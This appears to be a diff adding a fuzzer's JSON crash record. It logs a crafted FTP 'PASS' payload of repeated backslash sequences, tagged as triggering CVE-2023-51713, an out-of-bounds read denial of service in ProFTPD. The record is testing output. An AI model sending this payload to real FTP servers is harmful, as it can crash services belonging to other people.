@@ -1,0 +1,18 @@
+{
+  "crash_id": "75b804268e90ced3",
+  "timestamp": "2025-12-28T16:30:37.000050",
+  "crash_type": "cve_trigger",
+  "payload": "PASS ..\\..\\..\\..\\",
+  "payload_hex": "50415353202e2e5c2e2e5c2e2e5c2e2e5c",
+  "payload_size": 17,
+  "command": "PASS",
+  "arguments": "..\\..\\..\\..\\",
+  "cve_id": "CVE-2023-51713",
+  "cve_name": "ProFTPD OOB Read DoS",
+  "error_message": "OOB read via quote/backslash mishandling",
+  "stack_trace": "",
+  "server_state": {},
+  "fuzzer_type": "vuln_test",
+  "iteration": 0,
+  "session_id": "90f1cf3b"
+}
